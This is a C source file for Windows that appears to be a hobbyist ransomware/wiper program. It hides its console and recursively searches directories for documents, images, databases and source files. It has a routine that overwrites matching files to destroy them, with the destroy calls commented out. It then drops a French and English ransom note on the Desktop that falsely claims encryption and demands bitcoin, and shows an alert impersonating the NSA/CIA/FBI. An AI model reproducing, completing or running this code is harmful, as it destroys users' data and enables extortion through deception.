//Utilisation personnel ou educatif seulement !

#include <windows.h>
#include <stdio.h>

#define BUFSIZE 4096
#define TAILLE 23

char * extensions[TAILLE] = {"bat", "pdf", "txt", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "jpg", "png", "csv", "sql", "mdb", "sln", "php", "asp", "aspx", "html", "xml", "psd"};

HANDLE hConsole;

HWND GetConsoleHwnd(void)
{
       #define MY_BUFSIZE 1024
       HWND hwndFound;
       char pszNewWindowTitle[MY_BUFSIZE];
       char pszOldWindowTitle[MY_BUFSIZE];

       GetConsoleTitle(pszOldWindowTitle, MY_BUFSIZE);
       wsprintf(pszNewWindowTitle,"%d/%d",
                   GetTickCount(),
                   GetCurrentProcessId());
       SetConsoleTitle(pszNewWindowTitle);
       Sleep(40);
       hwndFound=FindWindow(NULL, pszNewWindowTitle);
       SetConsoleTitle(pszOldWindowTitle);
       return(hwndFound);
}

LPTSTR getEnviVar(LPCTSTR name)
{
    LPTSTR buffer = (LPTSTR) malloc(BUFSIZE * sizeof(TCHAR));;

    DWORD dwRet = GetEnvironmentVariable(name, buffer, BUFSIZE);

    if(dwRet == 0)
    {
        exit(36);
    }

    return buffer;
}

int Destroy_File(const char * fname)
{
    FILE * f = fopen(fname, "wb");

    if (f != NULL)
    {
        int var = 0;

        fwrite(&var, sizeof(var), 1, f);

        fclose(f);

        return 1;
    }
    else return 0;
}

char* concat(const char *s1, const char *s2)
{
    const size_t len1 = strlen(s1);
    const size_t len2 = strlen(s2);
    char * result = malloc(len1+len2+1);

    memcpy(result, s1, len1);
    memcpy(result+len1, s2, len2+1);
    return result;
}

const char *get_filename_ext(const char *filename) {
    const char *dot = strrchr(filename, '.');
    if(!dot || dot == filename) return "";
    return dot + 1;
}

int isExtension(const char * fname)
{
    const char * ext = get_filename_ext(fname);
    int i = 0;

    for(i = 0; i < TAILLE; i++)
    {
        if(!strcmp(ext, extensions[i]))
        {
            return 1;
        }
    }

    return 0;
}

int search_destroy(const char * fname)
{
    WIN32_FIND_DATA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    hFind = FindFirstFile(concat(fname, "/*.*"), &ffd);

    do
    {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if(strcmp(ffd.cFileName, ".") && strcmp(ffd.cFileName, ".."))
            {
                search_destroy(concat(concat(fname, "/"), ffd.cFileName));
            }
        }
        else
        {
            if(isExtension(ffd.cFileName))
            {
                //Destroy_File(concat(concat(fname, "/"), ffd.cFileName));
            }
        }
    }
    while(FindNextFile(hFind, &ffd) != 0);

    FindClose(hFind);
    return 1;
}

int main()
{
    hConsole = GetConsoleHwnd();
    ShowWindow(hConsole, SW_HIDE);

    //search_destroy(getEnviVar("ProgramFiles"));
    //search_destroy(getEnviVar("APPDATA"));

    char * name = getEnviVar("username");

    char * desktop = concat("C:/Users/", name);

    FILE * f = fopen(concat(desktop, "/Desktop/READ_ME.txt"), "w");

    if(f != NULL)
    {
        fprintf(f, "Bonjour %s,\nToutes les donnees de votre PC on etais crypter, veuillez envoyer 15 euros en bitcoin a cette adresse: \nMerci d'avance,\nCordialement un fouteur de merde :D !\n\n", name);
        fprintf(f, "Hello %s,\nAll your computer data's have been encrypted, please send 15 euros bitcoin to this adress: \nFaithfully,\nCordially troublemaker :D !", name);
        fclose(f);
    }

    MessageBox(NULL, "Hello ! Check the ReadMe file in the desktop please :) !\nBonjour, regardez le fichier ReadMe sur le bureau svp :) !", "Message de la NSA/CIA/FBI", MB_OK | MB_ICONWARNING);
    Beep(1500, 5000);

    return 0;
}
